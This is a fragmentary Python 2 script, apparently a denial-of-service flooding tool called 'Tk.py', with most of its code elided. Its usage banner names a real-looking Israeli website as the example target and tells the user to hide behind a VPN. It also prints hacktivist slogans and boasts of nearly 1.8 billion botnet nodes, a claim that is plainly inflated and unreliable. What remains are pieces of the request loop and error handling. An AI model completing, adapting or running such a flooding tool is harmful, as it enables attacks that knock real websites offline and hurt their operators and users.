...
os.system(" clear ")
def usage():
	print 'Tk.py  DDoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: Tk.py  (url)'
	print 'Use a vpn '
        print 'Example: python2 Tk.py http://luthi.co.il/'
	print "\a"
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> ! We are The Otherside - ExpectUS ! <<<-----"
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending mass amounf of packets generated by TK Botnet --"
